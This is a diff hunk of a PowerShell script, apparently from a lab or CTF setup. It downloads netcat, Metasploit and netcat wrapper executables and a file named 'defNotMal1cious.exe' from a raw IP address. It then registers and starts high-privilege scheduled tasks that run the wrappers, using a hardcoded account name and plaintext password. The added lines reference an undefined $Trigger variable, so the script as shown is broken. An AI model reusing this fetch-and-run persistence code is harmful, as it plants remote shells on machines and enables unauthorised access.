@@ -9,11 +9,11 @@ Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFi
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMal1cious.exe;
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperMSF.exe -OutFile C:/windowsWrapperMSF.exe;
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.exe -OutFile C:/windowsWrapperNC.exe;
-$jobname = "windowsNC"
-$script =  "c:\windowsWrapperNC.exe"
-$repeat = (New-TimeSpan -Minutes 1)
-$action = New-ScheduledTaskAction –Execute "$pshome\powershell.exe" -Argument  "$script; quit"
-$duration = ([timeSpan]::maxvalue)
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval $repeat -RepetitionDuration $duration
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
-Register-ScheduledTask -TaskName $jobname -Action $action -Trigger $trigger -RunLevel Highest -User "System" -Settings $settings
+$startTime = (get-date).AddMinutes(2).ToString("HH:mm")
+$Action1=New-ScheduledTaskAction -Execute Powershell.exe -WorkingDirectory C:/ -Argument '.\windowsWrapperNC.exe';
+Register-ScheduledTask -TaskName "windowsNC" -Action $Action1 -Trigger $Trigger -RunLevel Highest -User "HashCrackUser1" -Password "This is a basic passphrase";
+Start-ScheduledTask -TaskName "windowsNC" -AsJob
+$startTime = (get-date).AddMinutes(2).ToString("HH:mm")
+$Action1=New-ScheduledTaskAction -Execute Powershell.exe -WorkingDirectory C:/ -Argument '.\windowsWrapperMSF.exe';
+Register-ScheduledTask -TaskName "windowsMSF" -Action $Action1 -Trigger $Trigger -RunLevel Highest -User "HashCrackUser1" -Password "This is a basic passphrase";
+Start-ScheduledTask -TaskName "windowsMSF" -AsJob
